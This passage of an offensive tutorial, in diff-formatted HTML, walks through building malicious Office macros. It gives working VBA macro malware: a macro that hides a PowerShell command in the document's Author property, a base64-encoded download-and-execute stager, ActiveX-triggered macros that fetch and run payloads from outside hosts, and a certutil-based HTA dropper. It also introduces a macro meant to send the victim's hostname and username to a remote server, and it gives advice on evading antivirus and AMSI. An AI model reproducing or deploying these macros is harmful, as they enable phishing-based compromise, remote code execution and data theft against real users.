+<p>It should be noted that the majority of these covered payloads will be picked up by AV or EDR solutions due to the constantly updated signature databases these solutions utilise. That being said, with proper obfuscation and customisation, a payload can be created to bypass these organisation defences. </p>
+<p>In the context of this tutorial, we will focus on development aspects only. More advanced payloads will be covered later on in the series. </p>
+<h2>Custom macro development.</h2>
+<h3>Macro Leverage File Properties</h3>
+<p>We will now look at a Macro leveraging one of the document file properties to hide a payload while using &ldquo;standard in&rdquo; to avoid logging. </p>
+<p>The following macro malware hides its PowerShell command resides in the author property. This macro malware also hides the PowerShell command arguments from command line logging via invocation with <code>StdIn.WriteLine</code>.</p>
+<p>PowerShell is launched with multiple command-line arguments to create as quiet execution as possible. For example, <code>-ExecutionPolicy Bypass</code> means no window and no loading of local profiles. </p>
+<p>It should be noted that some AV Solutions pick up <code>AutoOpen</code>, and therefore more creative ways should be employed for macro execution, such as triggering the macro from a button. Every time a modification is performed, either in the macro or the file content, followed by the subsequent saving of the document, the &ldquo;Author&rdquo; property will be deleted. Consequently, the PowerShell command will need to be entered again, achieved with a right-click on the file and entering the PowerShell command in the &ldquo;Author&rdquo; property again. </p>
+<p>Another widely used technique by macro malware authors is to hide the payload on custom Excel forms or even inside the working spreadsheet in a coded form, as we will see later in this tutorial. The PowerShell command that this macro malware will execute may get picked up by Microsoft, Anti-Malware Scan Interface (AMSI) within Windows 10 environments. In the following parts of this tutorial, we will see ways to bypass AMSI. </p>
+<p>Lastly, it should be observed that the variable &ldquo;c&rdquo; is not used anywhere in the macro, and including some unused code is a simple obfuscation tactic.</p>
+<div class="codehilite"><pre><span></span><code><span class="k">Public</span> <span class="k">Sub</span> <span class="nf">PrintDocumentProperties</span><span class="p">()</span>
+    <span class="k">Dim</span> <span class="n">oApp</span> <span class="ow">As</span> <span class="k">New</span> <span class="n">Excel</span><span class="p">.</span><span class="n">Application</span>
+    <span class="k">Dim</span> <span class="n">oWB</span> <span class="ow">As</span> <span class="n">Workbook</span>
+    <span class="k">Set</span> <span class="n">oWB</span> <span class="o">=</span> <span class="n">ActiveWorkbook</span>
+
+    <span class="k">Dim</span> <span class="n">Exec</span> <span class="ow">As</span> <span class="kt">String</span>
+
+    <span class="cp">#If VBA7 Then</span>
+<span class="k">Dim</span> <span class="n">rwxpage</span> <span class="ow">As</span> <span class="n">LongPtr</span><span class="p">,</span> <span class="n">res</span> <span class="ow">As</span> <span class="n">LongPtr</span>
+<span class="cp">#Else</span>
+<span class="k">Dim</span> <span class="n">rwxpage</span> <span class="ow">As</span> <span class="kt">Long</span><span class="p">,</span> <span class="n">res</span> <span class="ow">As</span> <span class="kt">Long</span>
+<span class="cp">#End If</span>
+
+    <span class="k">Dim</span> <span class="n">author</span> <span class="ow">As</span> <span class="kt">String</span>
+    <span class="n">author</span> <span class="o">=</span> <span class="n">oWB</span><span class="p">.</span><span class="n">BuiltinDocumentProperties</span><span class="p">(</span><span class="s">&quot;Author&quot;</span><span class="p">)</span>
+
+    <span class="k">Set</span> <span class="n">objWshell</span> <span class="o">=</span> <span class="n">VBA</span><span class="p">.</span><span class="n">CreateObject</span><span class="p">(</span><span class="s">&quot;WScript.Shell&quot;</span><span class="p">)</span>
+
+<span class="k">Dim</span> <span class="n">c</span> <span class="ow">As</span> <span class="kt">String</span>
+<span class="k">Const</span> <span class="n">quote</span> <span class="ow">As</span> <span class="kt">String</span> <span class="o">=</span> <span class="s">&quot;&quot;&quot;&quot;</span>
+
+<span class="n">c</span> <span class="o">=</span> <span class="s">&quot;WwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AUwBlAHIAdgBpAEMAZQBQAE8ASQBOAHQATQBhAE4AYQBnAEUAUgBdADoAOgBFAFgAcABlAEMAVAAxADAAMABDAG8AbgB0AGkATgBVAEUAIAA9ACAAMAA7ACQAVwBjAD0ATgBlAFcALQBPAEIASgBFAGMAVAAgAFMAWQBTAHQAZQBNAC4ATgBlAFQALgBXAGUAYgBDAEwAaQBlAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAQwAuAEgARQBhAEQAZQByAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAUgBPAFgAeQAgAD0AIABbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBXAEUAQgBSAEUAcQB1AEUAcwB0AF0AOgA6AEQARQBGAEEAVQBMAFQAVwBFAEIAUABSAE8AWAB5ADsAJABXAEMALgBQAFIATwBYAFkALgBDAFIARQBEAGUATgBUAEkAQQBsAHMAI&quot;</span>
+<span class="n">c</span> <span class="o">=</span> <span class="n">c</span> <span class="o">+</span> <span class="s">&quot;AA9ACAAWwBTAFkAcwBUAGUAbQAuAE4ARQB0AC4AQwByAEUAZABFAG4AVABJAEEAbABDAEEAYwBoAEUAXQA6ADoARABlAGYAQQBVAGwAdABOAEUAdAB3AG8AUgBLAEMAcgBlAGQAZQBuAHQAaQBhAGwAUwA7ACQASwA9ACcAMwBlACoARwBrAFkATABVAFMAdgA2AGEAYgA0AE8ASwAhACUAUABpAEAAJAB0AHEAOQBcAD4AfAB+AHUAKwBSACcAOwAkAGkAPQAwADsAWwBjAGgAQQBSAFsAXQBdACQAYgA9ACgAWwBjAEgAYQByAFsAXQBdACgAJABXAGMALgBEAE8AdwBOAEwATwBBAEQAUwB0AFIAaQBOAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIALgA3ADoAOAAwADgAMAAvAGkAbgBkAGUAeAAuAGEAcwBwACIAKQApACkAfAAlAHsAJABfAC0AYgBYAG8AcgAkAGsAWwAkAEkAKwArACUAJABLAC4ATABlAG4AZwB0AGgAXQB9ADsASQBFAFgAIAAoACQAQgAtAEoATwBJAE4AJwAnACkA&quot;</span>
+
+<span class="k">Dim</span> <span class="n">objWshell1</span> <span class="ow">As</span> <span class="kt">Object</span>
+<span class="k">Set</span> <span class="n">objWshell1</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">&quot;WScript.Shell&quot;</span><span class="p">)</span>
+<span class="k">With</span> <span class="n">objWshell1</span><span class="p">.</span><span class="n">Exec</span><span class="p">(</span><span class="s">&quot;powershell.exe -nop -windowstyle hidden -Command -&quot;</span><span class="p">)</span>
+<span class="p">.</span><span class="n">StdIn</span><span class="p">.</span><span class="n">WriteLine</span> <span class="n">author</span>
+<span class="p">.</span><span class="n">StdIn</span><span class="p">.</span><span class="n">WriteBlankLines</span> <span class="mi">1</span>
+<span class="p">.</span><span class="n">Terminate</span>
+<span class="k">End</span> <span class="k">With</span>
+
+<span class="k">End</span> <span class="k">Sub</span>
+</code></pre></div>
+
+<h3>Using Active X Controls For Macro Execution</h3>
+<p>Most malicious Word documents use the reserved names of AutoOpen() and Document_Open() to run macros automatically. These names seem to be picked up by antiviruses (AVs) frequently. The following macro malware uses a subroutine inside an ActiveX control to execute its code. More specifically, it uses an ink edit control.</p>
+<p>Embedding an ActiveX control in a document is straightforward once the developer tab is enabled.</p>
+<ol>
+<li>Open the dev tab</li>
+<li>Go to the control section of the ribbon</li>
+<li>We find an extensive list of controls under legacy tools — more options.</li>
+</ol>
+<p>When using ActiveX control for macro execution, the victim will see the following warning.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">Sub</span> <span class="n">InkEdit1_GotFocus</span><span class="p">()</span>
+<span class="n">Run</span> <span class="o">=</span> <span class="n">Shell</span><span class="p">(</span><span class="s2">&quot;cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile(&#39;https://trusted.domain/file.exe&#39;,‘file.exe&#39;);Start-Process ‘file.exe&#39;&quot;</span><span class="p">,</span> <span class="n">vbNormalFocus</span><span class="p">)</span>
+<span class="n">End</span> <span class="n">Sub</span>
+</code></pre></div>
+
+<p>Many procedures related to ActiveX control objects can automatically run a macro; some can be seen in the following tables on http://www.greyhathacker.net/?p=948.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">Sub</span><span class="w"> </span><span class="n">InkEdit1_GotFocus</span><span class="p">()</span><span class="w"></span>
+<span class="n">Debugging</span><span class="w"></span>
+<span class="k">End</span><span class="w"> </span><span class="n">Sub</span><span class="w"></span>
+
+<span class="k">Public</span><span class="w"> </span><span class="k">Function</span><span class="w"> </span><span class="n">Debugging</span><span class="p">()</span><span class="w"> </span><span class="k">As</span><span class="w"> </span><span class="n">Variant</span><span class="w"></span>
+<span class="w">    </span><span class="n">Const</span><span class="w"> </span><span class="n">HIDDEN_WINDOW</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
+<span class="w">    </span><span class="n">strComputer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;.&quot;</span><span class="w"></span>
+<span class="w">    </span><span class="k">Set</span><span class="w"> </span><span class="n">objWMIService</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetObject</span><span class="p">(</span><span class="ss">&quot;winmgmts:\\&quot;</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">strComputer</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="ss">&quot;\root\cimv2&quot;</span><span class="p">)</span><span class="w"></span>
+<span class="w">    </span><span class="k">Set</span><span class="w"> </span><span class="n">objStartup</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">objWMIService</span><span class="p">.</span><span class="k">Get</span><span class="p">(</span><span class="ss">&quot;Win32_ProcessStartup&quot;</span><span class="p">)</span><span class="w"></span>
+<span class="w">    </span><span class="k">Set</span><span class="w"> </span><span class="n">objConfig</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">objStartup</span><span class="p">.</span><span class="n">SpawnInstance_</span><span class="w"></span>
+<span class="w">    </span><span class="n">objConfig</span><span class="p">.</span><span class="n">ShowWindow</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HIDDEN_WINDOW</span><span class="w"></span>
+<span class="w">    </span><span class="k">Set</span><span class="w"> </span><span class="n">objProcess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetObject</span><span class="p">(</span><span class="ss">&quot;winmgmts:\\&quot;</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">strComputer</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="ss">&quot;\root\cimv2:Win32_Process&quot;</span><span class="p">)</span><span class="w"></span>
+<span class="w">    </span><span class="n">objProcess</span><span class="p">.</span><span class="k">Create</span><span class="w"> </span><span class="ss">&quot;powe&quot;</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="ss">&quot;rshell.e&quot;</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="ss">&quot;xe&quot;</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="ss">&quot; -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c if ([IntPtr]::size -eq 4) {(new-object Net.WebClient).DownloadString(&#39;https://attacker.domain/stager1.ps1&#39;) | iex } else {(new-object Net.WebClient).DownloadString(&#39;https://attacker.domain/stager2.ps1&#39;) | iex}&quot;</span><span class="w"></span>
+<span class="k">End</span><span class="w"> </span><span class="k">Function</span><span class="w"></span>
+</code></pre></div>
+
+<h3>Classic Download and Execute Macro</h3>
+<p>We will look at the classic download and execute macro payload, but with a twist. The following macro malware leverages Windows certutil to first drop a base64-encoded HTA file and then uses certutil to decode and execute it.</p>
+<p>HTA files have a good record of evading defences. They can be easily obfuscated and can be used in numerous attack scenarios. In comparison, dropping an EXE file is a technique more prone to detection. </p>
+<div class="codehilite"><pre><span></span><code><span class="n">Sub</span> <span class="n">DownloadAndExec</span><span class="p">()</span>
+
+<span class="n">Dim</span> <span class="n">xHttp</span><span class="p">:</span> <span class="n">Set</span> <span class="n">xHttp</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s2">&quot;Microsoft.XMLHTTP&quot;</span><span class="p">)</span>
+<span class="n">Dim</span> <span class="n">bStrm</span><span class="p">:</span> <span class="n">Set</span> <span class="n">bStrm</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s2">&quot;Adodb.Stream&quot;</span><span class="p">)</span>
+<span class="n">xHttp</span><span class="o">.</span><span class="n">Open</span> <span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;https://trusted.domain/encoded.crt&quot;</span><span class="p">,</span> <span class="n">False</span>
+<span class="n">xHttp</span><span class="o">.</span><span class="n">Send</span>
+
+<span class="n">With</span> <span class="n">bStrm</span>
+    <span class="o">.</span><span class="n">Type</span> <span class="o">=</span> <span class="mi">1</span> <span class="s1">&#39;//binary</span>
+    <span class="o">.</span><span class="n">Open</span>
+    <span class="o">.</span><span class="n">write</span> <span class="n">xHttp</span><span class="o">.</span><span class="n">responseBody</span>
+    <span class="o">.</span><span class="n">savetofile</span> <span class="s2">&quot;encoded.crt&quot;</span><span class="p">,</span> <span class="mi">2</span> <span class="s1">&#39;//overwrite</span>
+<span class="n">End</span> <span class="n">With</span>
+
+<span class="n">Shell</span> <span class="p">(</span><span class="s2">&quot;cmd /c certutil -decode encoded.crt encoded.hta &amp; start encoded.hta&quot;</span><span class="p">)</span>
+
+<span class="n">End</span> <span class="n">Sub</span>
+</code></pre></div>
+
+<p>Metasploit, PowerShell Empire, SET, Unicorn and numerous other frameworks provide the capability of exporting their stages in the form of HTA files, or it is possible to develop a custom HTA file.</p>
+<h3>Macro Malware with OS Appropriate Payload</h3>
+<p>We will now look at a macro malware that retrieves the operating system distribution and executes the appropriate payload. The following macro malware is context-aware since it identifies the operating system in which it runs and understands whether it is running on a Windows or Mac OSX environment, after which it executes the appropriate payload to compromise its target. In addition, it retrieves both the victims&rsquo; hostname and username; then base64 encodes them and sends them back to the remote server.</p>
+<div class="codehilite"><pre><span></span><code><span class="s1">&#39;get OS, if nt else if OS X</span>
+<span class="n">Private</span> <span class="n">Declare</span> <span class="n">PtrSafe</span> <span class="n">Function</span> <span class="n">system</span> <span class="n">Lib</span> <span class="s2">&quot;libc.dylib&quot;</span> <span class="p">(</span><span class="n">ByVal</span> <span class="n">command</span> <span class="n">As</span> <span class="nb nb-Type">String</span><span class="p">)</span> <span class="n">As</span> <span class="n">Long</span>
+
+<span class="s1">&#39; A Base64 Encoder/Decoder.</span>
+<span class="s1">&#39;</span>
+<span class="s1">&#39; This module is used to encode and decode data in Base64 format as described in RFC 1521.</span>
+<span class="s1">&#39;</span>
+<span class="s1">&#39; Home page: www.source-code.biz.</span>
+<span class="s1">&#39; License: GNU/LGPL (www.gnu.org/licenses/lgpl.html).</span>
+<span class="s1">&#39; Copyright 2007: Christian d&#39;</span><span class="n">Heureuse</span><span class="p">,</span> <span class="n">Inventec</span> <span class="n">Informatik</span> <span class="n">AG</span><span class="p">,</span> <span class="n">Switzerland</span><span class="o">.</span>
+<span class="s1">&#39; This module is provided &quot;as is&quot; without warranty of any kind.</span>
+
+<span class="n">Option</span> <span class="n">Explicit</span>
+
+<span class="n">Private</span> <span class="n">InitDone</span>  <span class="n">As</span> <span class="n">Boolean</span>
+<span class="n">Private</span> <span class="n">Map1</span><span class="p">(</span><span class="mi">0</span> <span class="n">To</span> <span class="mi">63</span><span class="p">)</span>  <span class="n">As</span> <span class="n">Byte</span>
+<span class="n">Private</span> <span class="n">Map2</span><span class="p">(</span><span class="mi">0</span> <span class="n">To</span> <span class="mi">127</span><span class="p">)</span> <span class="n">As</span> <span class="n">Byte</span>
+
+<span class="s1">&#39; Encodes a string into Base64 format.</span>
+<span class="s1">&#39; No blanks or line breaks are inserted.</span>
+<span class="s1">&#39; Parameters:</span>
+<span class="s1">&#39;   S         a String to be encoded.</span>
+<span class="s1">&#39; Returns:    a String with the Base64 encoded data.</span>
+<span class="n">Public</span> <span class="n">Function</span> <span class="n">Base64EncodeString</span><span class="p">(</span><span class="n">ByVal</span> <span class="n">s</span> <span class="n">As</span> <span class="nb nb-Type">String</span><span class="p">)</span> <span class="n">As</span> <span class="nb nb-Type">String</span>
+   <span class="n">Base64EncodeString</span> <span class="o">=</span> <span class="n">Base64Encode</span><span class="p">(</span><span class="n">ConvertStringToBytes</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
+   <span class="n">End</span> <span class="n">Function</span>
+
+<span class="s1">&#39; Encodes a byte array into Base64 format.</span>
+<span class="s1">&#39; No blanks or line breaks are inserted.</span>
+<span class="s1">&#39; Parameters:</span>
+<span class="s1">&#39;   InData    an array containing the data bytes to be encoded.</span>
+<span class="s1">&#39; Returns:    a string with the Base64 encoded data.</span>
+<span class="n">Public</span> <span class="n">Function</span> <span class="n">Base64Encode</span><span class="p">(</span><span class="n">InData</span><span class="p">()</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">)</span>
+   <span class="n">Base64Encode</span> <span class="o">=</span> <span class="n">Base64Encode2</span><span class="p">(</span><span class="n">InData</span><span class="p">,</span> <span class="n">UBound</span><span class="p">(</span><span class="n">InData</span><span class="p">)</span> <span class="o">-</span> <span class="n">LBound</span><span class="p">(</span><span class="n">InData</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+   <span class="n">End</span> <span class="n">Function</span>
+
+<span class="s1">&#39; Encodes a byte array into Base64 format.</span>
+<span class="s1">&#39; No blanks or line breaks are inserted.</span>
+<span class="s1">&#39; Parameters:</span>
+<span class="s1">&#39;   InData    an array containing the data bytes to be encoded.</span>
+<span class="s1">&#39;   InLen     number of bytes to process in InData.</span>
+<span class="s1">&#39; Returns:    a string with the Base64 encoded data.</span>
+<span class="n">Public</span> <span class="n">Function</span> <span class="n">Base64Encode2</span><span class="p">(</span><span class="n">InData</span><span class="p">()</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">,</span> <span class="n">ByVal</span> <span class="n">InLen</span> <span class="n">As</span> <span class="n">Long</span><span class="p">)</span> <span class="n">As</span> <span class="nb nb-Type">String</span>
+   <span class="n">If</span> <span class="n">Not</span> <span class="n">InitDone</span> <span class="n">Then</span> <span class="n">Init</span>
+   <span class="n">If</span> <span class="n">InLen</span> <span class="o">=</span> <span class="mi">0</span> <span class="n">Then</span> <span class="n">Base64Encode2</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">:</span> <span class="n">Exit</span> <span class="n">Function</span>
+   <span class="n">Dim</span> <span class="n">ODataLen</span> <span class="n">As</span> <span class="n">Long</span><span class="p">:</span> <span class="n">ODataLen</span> <span class="o">=</span> <span class="p">(</span><span class="n">InLen</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> \ <span class="mi">3</span>     <span class="s1">&#39; output length without padding</span>
+   <span class="n">Dim</span> <span class="n">OLen</span> <span class="n">As</span> <span class="n">Long</span><span class="p">:</span> <span class="n">OLen</span> <span class="o">=</span> <span class="p">((</span><span class="n">InLen</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> \ <span class="mi">3</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>           <span class="s1">&#39; output length including padding</span>
+   <span class="n">Dim</span> <span class="n">Out</span><span class="p">()</span> <span class="n">As</span> <span class="n">Byte</span>
+   <span class="n">ReDim</span> <span class="n">Out</span><span class="p">(</span><span class="mi">0</span> <span class="n">To</span> <span class="n">OLen</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="n">As</span> <span class="n">Byte</span>
+   <span class="n">Dim</span> <span class="n">ip0</span> <span class="n">As</span> <span class="n">Long</span><span class="p">:</span> <span class="n">ip0</span> <span class="o">=</span> <span class="n">LBound</span><span class="p">(</span><span class="n">InData</span><span class="p">)</span>
+   <span class="n">Dim</span> <span class="n">ip</span> <span class="n">As</span> <span class="n">Long</span>
+   <span class="n">Dim</span> <span class="n">op</span> <span class="n">As</span> <span class="n">Long</span>
+   <span class="n">Do</span> <span class="n">While</span> <span class="n">ip</span> <span class="o">&lt;</span> <span class="n">InLen</span>
+      <span class="n">Dim</span> <span class="n">i0</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">:</span> <span class="n">i0</span> <span class="o">=</span> <span class="n">InData</span><span class="p">(</span><span class="n">ip0</span> <span class="o">+</span> <span class="n">ip</span><span class="p">):</span> <span class="n">ip</span> <span class="o">=</span> <span class="n">ip</span> <span class="o">+</span> <span class="mi">1</span>
+      <span class="n">Dim</span> <span class="n">i1</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">:</span> <span class="n">If</span> <span class="n">ip</span> <span class="o">&lt;</span> <span class="n">InLen</span> <span class="n">Then</span> <span class="n">i1</span> <span class="o">=</span> <span class="n">InData</span><span class="p">(</span><span class="n">ip0</span> <span class="o">+</span> <span class="n">ip</span><span class="p">):</span> <span class="n">ip</span> <span class="o">=</span> <span class="n">ip</span> <span class="o">+</span> <span class="mi">1</span> <span class="n">Else</span> <span class="n">i1</span> <span class="o">=</span> <span class="mi">0</span>
+      <span class="n">Dim</span> <span class="n">i2</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">:</span> <span class="n">If</span> <span class="n">ip</span> <span class="o">&lt;</span> <span class="n">InLen</span> <span class="n">Then</span> <span class="n">i2</span> <span class="o">=</span> <span class="n">InData</span><span class="p">(</span><span class="n">ip0</span> <span class="o">+</span> <span class="n">ip</span><span class="p">):</span> <span class="n">ip</span> <span class="o">=</span> <span class="n">ip</span> <span class="o">+</span> <span class="mi">1</span> <span class="n">Else</span> <span class="n">i2</span> <span class="o">=</span> <span class="mi">0</span>
+      <span class="n">Dim</span> <span class="n">o0</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">:</span> <span class="n">o0</span> <span class="o">=</span> <span class="n">i0</span> \ <span class="mi">4</span>
+      <span class="n">Dim</span> <span class="n">o1</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">:</span> <span class="n">o1</span> <span class="o">=</span> <span class="p">((</span><span class="n">i0</span> <span class="n">And</span> <span class="mi">3</span><span class="p">)</span> <span class="o">*</span> <span class="o">&amp;</span><span class="n">H10</span><span class="p">)</span> <span class="n">Or</span> <span class="p">(</span><span class="n">i1</span> \ <span class="o">&amp;</span><span class="n">H10</span><span class="p">)</span>
+      <span class="n">Dim</span> <span class="n">o2</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">:</span> <span class="n">o2</span> <span class="o">=</span> <span class="p">((</span><span class="n">i1</span> <span class="n">And</span> <span class="o">&amp;</span><span class="n">HF</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="n">Or</span> <span class="p">(</span><span class="n">i2</span> \ <span class="o">&amp;</span><span class="n">H40</span><span class="p">)</span>
+      <span class="n">Dim</span> <span class="n">o3</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">:</span> <span class="n">o3</span> <span class="o">=</span> <span class="n">i2</span> <span class="n">And</span> <span class="o">&amp;</span><span class="n">H3F</span>
+      <span class="n">Out</span><span class="p">(</span><span class="n">op</span><span class="p">)</span> <span class="o">=</span> <span class="n">Map1</span><span class="p">(</span><span class="n">o0</span><span class="p">):</span> <span class="n">op</span> <span class="o">=</span> <span class="n">op</span> <span class="o">+</span> <span class="mi">1</span>
+      <span class="n">Out</span><span class="p">(</span><span class="n">op</span><span class="p">)</span> <span class="o">=</span> <span class="n">Map1</span><span class="p">(</span><span class="n">o1</span><span class="p">):</span> <span class="n">op</span> <span class="o">=</span> <span class="n">op</span> <span class="o">+</span> <span class="mi">1</span>
+      <span class="n">Out</span><span class="p">(</span><span class="n">op</span><span class="p">)</span> <span class="o">=</span> <span class="n">IIf</span><span class="p">(</span><span class="n">op</span> <span class="o">&lt;</span> <span class="n">ODataLen</span><span class="p">,</span> <span class="n">Map1</span><span class="p">(</span><span class="n">o2</span><span class="p">),</span> <span class="n">Asc</span><span class="p">(</span><span class="s2">&quot;=&quot;</span><span class="p">)):</span> <span class="n">op</span> <span class="o">=</span> <span class="n">op</span> <span class="o">+</span> <span class="mi">1</span>
+      <span class="n">Out</span><span class="p">(</span><span class="n">op</span><span class="p">)</span> <span class="o">=</span> <span class="n">IIf</span><span class="p">(</span><span class="n">op</span> <span class="o">&lt;</span> <span class="n">ODataLen</span><span class="p">,</span> <span class="n">Map1</span><span class="p">(</span><span class="n">o3</span><span class="p">),</span> <span class="n">Asc</span><span class="p">(</span><span class="s2">&quot;=&quot;</span><span class="p">)):</span> <span class="n">op</span> <span class="o">=</span> <span class="n">op</span> <span class="o">+</span> <span class="mi">1</span>
+      <span class="n">Loop</span>
+   <span class="n">Base64Encode2</span> <span class="o">=</span> <span class="n">ConvertBytesToString</span><span class="p">(</span><span class="n">Out</span><span class="p">)</span>
+   <span class="n">End</span> <span class="n">Function</span>
+
+<span class="s1">&#39; Decodes a string from Base64 format.</span>
+<span class="s1">&#39; Parameters:</span>
+<span class="s1">&#39;    s        a Base64 String to be decoded.</span>
+<span class="s1">&#39; Returns     a String containing the decoded data.</span>
+<span class="n">Public</span> <span class="n">Function</span> <span class="n">Base64DecodeString</span><span class="p">(</span><span class="n">ByVal</span> <span class="n">s</span> <span class="n">As</span> <span class="nb nb-Type">String</span><span class="p">)</span> <span class="n">As</span> <span class="nb nb-Type">String</span>
+   <span class="n">If</span> <span class="n">s</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span> <span class="n">Then</span> <span class="n">Base64DecodeString</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">:</span> <span class="n">Exit</span> <span class="n">Function</span>
+   <span class="n">Base64DecodeString</span> <span class="o">=</span> <span class="n">ConvertBytesToString</span><span class="p">(</span><span class="n">Base64Decode</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
+   <span class="n">End</span> <span class="n">Function</span>
+
+<span class="s1">&#39; Decodes a byte array from Base64 format.</span>
+<span class="s1">&#39; Parameters</span>
+<span class="s1">&#39;   s         a Base64 String to be decoded.</span>
+<span class="s1">&#39; Returns:    an array containing the decoded data bytes.</span>
+<span class="n">Public</span> <span class="n">Function</span> <span class="n">Base64Decode</span><span class="p">(</span><span class="n">ByVal</span> <span class="n">s</span> <span class="n">As</span> <span class="nb nb-Type">String</span><span class="p">)</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">()</span>
+   <span class="n">If</span> <span class="n">Not</span> <span class="n">InitDone</span> <span class="n">Then</span> <span class="n">Init</span>
+   <span class="n">Dim</span> <span class="n">IBuf</span><span class="p">()</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">:</span> <span class="n">IBuf</span> <span class="o">=</span> <span class="n">ConvertStringToBytes</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+   <span class="n">Dim</span> <span class="n">ILen</span> <span class="n">As</span> <span class="n">Long</span><span class="p">:</span> <span class="n">ILen</span> <span class="o">=</span> <span class="n">UBound</span><span class="p">(</span><span class="n">IBuf</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
+   <span class="n">If</span> <span class="n">ILen</span> <span class="n">Mod</span> <span class="mi">4</span> <span class="o">&lt;&gt;</span> <span class="mi">0</span> <span class="n">Then</span> <span class="n">Err</span><span class="o">.</span><span class="n">Raise</span> <span class="n">vbObjectError</span><span class="p">,</span> <span class="p">,</span> <span class="s2">&quot;Length of Base64 encoded input string is not a multiple of 4.&quot;</span>
+   <span class="n">Do</span> <span class="n">While</span> <span class="n">ILen</span> <span class="o">&gt;</span> <span class="mi">0</span>
+      <span class="n">If</span> <span class="n">IBuf</span><span class="p">(</span><span class="n">ILen</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&gt;</span> <span class="n">Asc</span><span class="p">(</span><span class="s2">&quot;=&quot;</span><span class="p">)</span> <span class="n">Then</span> <span class="n">Exit</span> <span class="n">Do</span>
+      <span class="n">ILen</span> <span class="o">=</span> <span class="n">ILen</span> <span class="o">-</span> <span class="mi">1</span>
+      <span class="n">Loop</span>
+   <span class="n">Dim</span> <span class="n">OLen</span> <span class="n">As</span> <span class="n">Long</span><span class="p">:</span> <span class="n">OLen</span> <span class="o">=</span> <span class="p">(</span><span class="n">ILen</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span> \ <span class="mi">4</span>
+   <span class="n">Dim</span> <span class="n">Out</span><span class="p">()</span> <span class="n">As</span> <span class="n">Byte</span>
+   <span class="n">ReDim</span> <span class="n">Out</span><span class="p">(</span><span class="mi">0</span> <span class="n">To</span> <span class="n">OLen</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="n">As</span> <span class="n">Byte</span>
+   <span class="n">Dim</span> <span class="n">ip</span> <span class="n">As</span> <span class="n">Long</span>
+   <span class="n">Dim</span> <span class="n">op</span> <span class="n">As</span> <span class="n">Long</span>
+   <span class="n">Do</span> <span class="n">While</span> <span class="n">ip</span> <span class="o">&lt;</span> <span class="n">ILen</span>
+      <span class="n">Dim</span> <span class="n">i0</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">:</span> <span class="n">i0</span> <span class="o">=</span> <span class="n">IBuf</span><span class="p">(</span><span class="n">ip</span><span class="p">):</span> <span class="n">ip</span> <span class="o">=</span> <span class="n">ip</span> <span class="o">+</span> <span class="mi">1</span>
